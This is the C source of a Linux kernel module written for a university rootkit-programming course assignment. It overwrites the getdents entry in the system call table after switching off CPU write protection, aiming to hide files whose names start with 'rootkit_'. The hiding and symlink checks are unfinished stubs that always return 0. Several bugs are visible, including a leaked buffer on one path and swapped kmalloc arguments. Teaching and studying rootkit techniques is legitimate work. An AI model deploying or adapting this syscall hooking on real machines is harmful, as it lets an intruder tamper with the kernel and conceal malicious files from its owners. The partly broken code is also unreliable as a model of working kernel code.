/*
 * Assignment 04 for the course Rootkit Programming at TUM in WS2014/15.
 * Implemented by Guru Chandrasekhara and Martin Herrmann.
 */
#include <asm/page.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/types.h>
#include <linux/syscalls.h>
#include <linux/init.h>
#include <linux/fs_struct.h>
#include <linux/fs.h>
#include <linux/fdtable.h>
#include <linux/rcupdate.h>
#include <linux/dcache.h>
#include <linux/slab.h>
#include <linux/unistd.h>
#include <linux/proc_fs.h>
#include <linux/delay.h>
#include <linux/string.h>

#include "sysmap.h"


/* Information for modinfo */
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Guru Chandrasekhara, Martin Herrmann");

void **sys_call_table;
asmlinkage int (*original_getdents) (unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage ssize_t (*syscall_readlink) (const char *path, char *buf, size_t bufsiz);

/*
 * counter to ensure every process has left our manipulated syscall before
 * we unload our module.
 */
static int call_counter = 0;

/* dirent structure */
struct linux_dirent {   
        unsigned long   d_ino;   
        unsigned long   d_off;   
        unsigned short  d_reclen;   
        char            d_name[1];   
 };   

/* Check whether we need to hide this file */
int hide(char *d_name)
{
	if(strstr(d_name, "rootkit_") == d_name) 
	{
		return 0;
	}

	return 0;
}

/* 
 * Checks whether a linux_dirent is a symbolic link and if it is
 * checks whether we need to hide it, too.
 */
int check_symlink(struct linux_dirent __user *dirp)
{
	
	return 0;
}

ssize_t get_path(unsigned int fd, char *path, size_t bufsiz) {
	struct files_struct *current_files;
	struct fdtable *files_table;
	struct path files_path;
	size_t path_len;
	char *cwd;
	char *buf = (char *) kmalloc(GFP_KERNEL, 128*sizeof(char));

	current_files = current->files;
	files_table = files_fdtable(current_files);
	
	files_path = files_table->fd[fd]->f_path;
	cwd = d_path(&files_path, buf, 100*sizeof(char));
	//printk(KERN_INFO "Found fd %d with name %s!\n", fd, cwd);
	path_len = strlen(cwd);
	
	/* check whether the supplied buffer is big enough */
	if(path_len > bufsiz) {
		return -ENOMEM;
	}
	
	memcpy(path, cwd, path_len);
	kfree(buf);
	
	return strlen(cwd);
}
   
/*
 * Our manipulated getdents syscall. It checks whether a particular file needs to be hidden.
 * If it matches then don't show, otherwise works normally and calls the original getdents.
 */
asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
{
	call_counter++;
	/* nothing else above this line */

	char buf[128];
	char lpath[128];
	char path[128];
	size_t path_len;
	size_t buf_len;
	size_t lpath_len;
	long ret;
	int len = 0;
	int tlen = 0;

	path_len = get_path(fd, path, 128);
	memset(path+path_len, '/', 1);
	path_len++;
	
	//printk(KERN_INFO "Len: %zu - Path: %s", path_len, path);
	ret = (*original_getdents) (fd,dirp,count);	
	tlen = ret;
		
	while(tlen>0)
	{
		len  = dirp->d_reclen;
		tlen = tlen-len;
		memset(lpath, 0, 128);	
		memset(buf, 0, 128);	
		memcpy(buf, path, path_len);
		memcpy(buf+path_len, dirp->d_name, strlen(dirp->d_name));
		memset(buf+path_len+strlen(dirp->d_name)+1, '\0', 1);
		printk(KERN_INFO "Currently parsing file %s\n", buf);
		lpath_len = (*syscall_readlink) (buf, lpath, 128);
		if(lpath_len > 0)
			printk(KERN_INFO "Found symlink to: %s\n", lpath);
		
		/* Check if we need to hide this file */
		if(hide(dirp->d_name))
		{	
			memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
			ret -= len;
		}
		else if(check_symlink(dirp)) /* we need to hide this symlink */
		{	
			memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
			ret -= len;
		}
		else if(tlen != 0)
		{
			dirp = (struct linux_dirent *) ((char*) dirp + dirp->d_reclen);
		}

	}
	
	/* nothing else below this line */
	call_counter--;
	return ret;
}


/*
 * Disable the writing protection for the whole processor.
 */
static void disable_page_protection (void)
{
	unsigned long value;
	asm volatile("mov %%cr0,%0" : "=r" (value));
	if (value & 0x00010000)
	{
		value &= ~0x00010000;
		asm volatile("mov %0,%%cr0": : "r" (value));
	}
}

/*
 * Reenable the writing protection for the whole processor.
 */
static void enable_page_protection (void)
{
	unsigned long value;
	asm volatile("mov %%cr0,%0" : "=r" (value));
	if (!(value & 0x00010000))
	{
		value |= 0x00010000;
		asm volatile("mov %0,%%cr0": : "r" (value));
    	}
}


/*
 * Function called when loading the kernel module.
 * Prints a welcome-message and replaces the getdents syscall.
 */
int init_module (void)
{	
	printk(KERN_INFO "Loading process-hider LKM...\n");
	
	/* get the pointer to the sys_call_table */
	sys_call_table = (void *) sysmap_sys_call_table;

	syscall_readlink = (void*) sys_call_table[__NR_readlink];

	/* disable the write protection */
	disable_page_protection();

	/* replace the syscall getdents */
	original_getdents = (void *) sys_call_table[__NR_getdents];
	sys_call_table[__NR_getdents] = (int *) manipulated_getdents;
	
	
	/* reenable the write protection */
	enable_page_protection();
	
	return 0;
}

/*
 * Function called when unloading the kernel module.
 * Prints a goodbye-message and restores the original getdent() syscall.
 */
void cleanup_module (void)
{
	/* disable write protection */
	disable_page_protection();
	
	/* restore the old syscall */
	sys_call_table[__NR_getdents] = (int *) original_getdents;

	/* reenable write protection */
	enable_page_protection();

	/* make sure that all processes have left our manipulated syscall */
	while(call_counter > 0) {
		msleep(10);
	}
	
	/* Finally, log the unloading */
	printk(KERN_INFO "Unloading process-hider... bye!\n");
}
